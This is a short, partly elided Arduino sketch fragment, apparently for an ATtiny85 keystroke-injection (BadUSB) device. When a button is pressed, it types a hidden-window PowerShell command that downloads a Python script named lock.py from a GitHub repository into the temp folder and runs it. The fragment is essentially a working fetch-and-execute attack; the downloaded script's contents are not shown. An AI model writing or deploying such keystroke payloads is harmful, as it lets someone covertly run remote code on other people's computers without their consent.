...
void loop() {
  ...
  if (buttonState == LOW) {
    ...
    DigiKeyboardFr.print("powershell -w hidden -Command \"if (Get-Command python -ErrorAction SilentlyContinue) { iwr https://github.com/IAidenI/ATtiny85/blob/main/BannerScreen/lock.py -OutFile $env:TEMP\\s.py; python $env:TEMP\\s.py }\"");
